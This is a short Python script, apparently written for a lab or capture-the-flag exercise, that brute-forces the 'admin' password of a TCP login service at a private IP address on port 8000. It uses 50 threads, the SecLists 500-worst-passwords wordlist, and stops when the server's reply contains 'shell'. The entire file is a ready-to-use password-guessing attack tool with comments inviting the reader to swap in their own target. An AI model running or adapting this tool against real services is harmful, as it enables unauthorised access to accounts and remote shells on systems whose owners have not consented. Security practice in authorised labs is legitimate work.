#!/usr/bin/env python3

import socket
import threading

target_ip = "10.201.88.90"       # Change this to your target IP
target_port = 8000                # Change this to your target port
username = "admin"
wordlist = "/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"  # Adjust your wordlist path
num_threads = 50
stop_flag = threading.Event()

def brute_force(passwords):
    for password in passwords:
        if stop_flag.is_set():
            return
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((target_ip, target_port))
                
                # Receive server prompt (adjust buffer size as needed)
                s.recv(1024)
                
                # Send username
                s.sendall(username.encode() + b"\n")
                s.recv(1024)  # Expecting "Password:" prompt
                
                # Send password attempt
                s.sendall(password.encode() + b"\n")
                
                response = s.recv(1024)
                if b"shell" in response:
                    print(f"[+] Password found: {password}")
                    stop_flag.set()
                    return
        except Exception:
            # Ignore connection errors and timeouts
            pass

def main():
    with open(wordlist, "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    chunk_size = (len(passwords) + num_threads - 1) // num_threads
    threads = []
    
    for i in range(num_threads):
        start = i * chunk_size
        end = min(start + chunk_size, len(passwords))
        if start < end:
            t = threading.Thread(target=brute_force, args=(passwords[start:end],))
            threads.append(t)
            t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
